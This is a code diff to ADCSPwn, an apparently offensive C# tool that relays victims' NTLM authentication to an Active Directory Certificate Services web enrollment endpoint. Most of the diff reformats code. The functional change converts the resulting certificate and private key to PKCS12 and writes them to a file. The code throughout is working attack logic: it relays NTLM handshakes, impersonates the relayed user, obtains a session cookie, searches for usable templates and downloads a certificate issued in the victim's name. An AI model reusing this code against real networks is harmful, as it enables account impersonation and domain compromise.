@@ -192,31 +192,34 @@ namespace ADCSPwn
                     var MsgType = BitConverter.ToInt16(NTLMHash, 8);
 
                     if (MsgType == 1)
-                    {                        
+                    {
                         // make the initial request without auth
                         Console.WriteLine("  |_ Attempting to access without authentication");
-                        HttpWebResponse HttpResp = SendWebRequest("http://"+Config.adcs+"/certsrv/certfnsh.asp", "GET", "", "", "");
+                        HttpWebResponse HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "", "");
                         HttpResp.Close();
 
                         int StatusCode = (int)HttpResp.StatusCode;
 
-                        if (StatusCode == 401) {
+                        if (StatusCode == 401)
+                        {
                             Console.WriteLine("  | |_ ACCESS_DENIED (this is expected)");
                         }
 
-                        else if (StatusCode == 200) {
+                        else if (StatusCode == 200)
+                        {
                             Console.WriteLine("  | |_ SUCCESS (does not appear to require authentication, exiting)");
                             System.Environment.Exit(1);
                         }
 
-                        else {
-                            Console.WriteLine("  | |_ "+StatusCode+" (unexpected status code, continuing)");
+                        else
+                        {
+                            Console.WriteLine("  | |_ " + StatusCode + " (unexpected status code, continuing)");
                         }
 
                         // start the negotiation
                         Console.WriteLine("  |_ Attempting to authenticate");
                         Console.WriteLine("    |_ Relaying NTLMSSP_NEGOTIATE to target");
-                        HttpResp = SendWebRequest("http://"+Config.adcs+"/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
                         HttpResp.Close();
 
                         // find the challenge
@@ -241,7 +244,7 @@ namespace ADCSPwn
 
                         // build the responce to the client whos auth we are relaying, giving them the ntlm challenge we have just been given
                         String resp = "";
-                        
+
                         resp += "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM ";
                         resp += challenge;
                         resp += "\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";
@@ -264,22 +267,23 @@ namespace ADCSPwn
                         var User_offset = BitConverter.ToInt16(NTLMHash, 40);
                         var User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
 
-                        Console.WriteLine("  |_ Impersonating: "+System.Text.Encoding.Unicode.GetString(Domain)+"\\"+System.Text.Encoding.Unicode.GetString(User));
+                        Console.WriteLine("  |_ Impersonating: " + System.Text.Encoding.Unicode.GetString(Domain) + "\\" + System.Text.Encoding.Unicode.GetString(User));
 
                         // send the challenge responce
-                        HttpWebResponse HttpResp = SendWebRequest("http://"+Config.adcs+"/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        HttpWebResponse HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
 
                         Console.WriteLine("  | |_ Relaying NTLMSSP_AUTH to target");
 
                         int StatusCode = (int)HttpResp.StatusCode;
 
                         // authentication should be a success
-                        if (StatusCode == 401) {
+                        if (StatusCode == 401)
+                        {
                             Console.WriteLine("    |_ Authentication failed :sadrio:");
                             Stream receiveStream = HttpResp.GetResponseStream();
                             StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8);
 
-                            Console.WriteLine (readStream.ReadToEnd());
+                            Console.WriteLine(readStream.ReadToEnd());
                             HttpResp.Close();
                             readStream.Close();
                             System.Environment.Exit(1);
@@ -298,15 +302,18 @@ namespace ADCSPwn
                         }
 
                         // validate our cookie works
-                        HttpResp = SendWebRequest("http://"+Config.adcs+"/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
+                        HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
                         HttpResp.Close();
 
                         StatusCode = (int)HttpResp.StatusCode;
 
-                        if (StatusCode != 200) {
+                        if (StatusCode != 200)
+                        {
                             Console.WriteLine("      |_ Authentication failed, but cookie was given? wtf");
                             System.Environment.Exit(1);
-                        } else {
+                        }
+                        else
+                        {
                             Console.WriteLine("  |   |_ SUCCESS");
                         }
 
@@ -332,7 +339,7 @@ namespace ADCSPwn
                         // generate the CSR
                         var pkcs10CertificationRequest = new Pkcs10CertificationRequest(PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id, subject, keyPair.Public, null, keyPair.Private);
                         var csr = Convert.ToBase64String(pkcs10CertificationRequest.GetEncoded());
-                        
+
                         // correctly format the certificate
                         var formatted_csr = "";
                         formatted_csr += "-----BEGIN CERTIFICATE REQUEST-----";
@@ -361,11 +368,12 @@ namespace ADCSPwn
                                 data += "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";
 
                                 // ask the CS to create the certificate
-                                HttpResp = SendWebRequest("http://"+Config.adcs+"/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
+                                HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
 
                                 StatusCode = (int)HttpResp.StatusCode;
 
-                                if (StatusCode == 200) {
+                                if (StatusCode == 200)
+                                {
                                     dataStream = HttpResp.GetResponseStream();
 
                                     reader = new StreamReader(dataStream);
@@ -375,14 +383,18 @@ namespace ADCSPwn
                                     {
                                         HttpResp.Close();
                                         continue;
-                                    } else {
+                                    }
+                                    else
+                                    {
                                         found_template = true;
 
                                         Console.WriteLine("  | |_ Found valid template: " + CertificateTemplates[i]);
 
                                         break;
                                     }
-                                } else {
+                                }
+                                else
+                                {
                                     HttpResp.Close();
                                 }
                             }
@@ -412,17 +424,17 @@ namespace ADCSPwn
 
                         HttpResp.Close();
 
-                        Console.WriteLine("  | |_ SUCCESS (ReqID: "+reqid+")");
+                        Console.WriteLine("  | |_ SUCCESS (ReqID: " + reqid + ")");
                         Console.WriteLine("  |_ Downloading certificate");
 
                         // download the created certificate
-                        HttpResp = SendWebRequest("http://"+Config.adcs+"/certsrv/certnew.cer?ReqID="+reqid, "GET", "", "Cookie", cookie);
+                        HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certnew.cer?ReqID=" + reqid, "GET", "", "Cookie", cookie);
 
                         string certificate = null;
                         using (dataStream = HttpResp.GetResponseStream())
                         {
                             reader = new StreamReader(dataStream);
-                            certificate = reader.ReadToEnd();                        
+                            certificate = reader.ReadToEnd();
                         }
 
                         HttpResp.Close();
@@ -439,11 +451,33 @@ namespace ADCSPwn
 
                         var bundle = certificate + privatekey.ToString();
 
-                        string b64_bundle = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(bundle));
+                        Console.WriteLine("    |_ Converting into PKCS12");
+
+
+                        var b64_bundle = PKCS12.ConvertToPKCS12(bundle);
 
                         Console.WriteLine("      |_ SUCCESS\n\n");
+                        if (string.IsNullOrEmpty(Config.outpath))
+                        {
+                            Console.WriteLine(b64_bundle);
+                        }
+                        else
+                        {
+                            try
+                            {
+                                File.WriteAllText(Config.outpath, b64_bundle);
+                                Console.WriteLine($"[i] Base64 encoded certificate written to {Config.outpath}");
+                            }
+                            catch (Exception ex)
+                            {
 
-                        Console.WriteLine(b64_bundle);
+                                Console.WriteLine($"[!] Failed to write certificate to {Config.outpath}!");
+                                Console.WriteLine(b64_bundle);
+                            }
+
+                        }
+
+
 
                         DieOnNextRun = true;
 
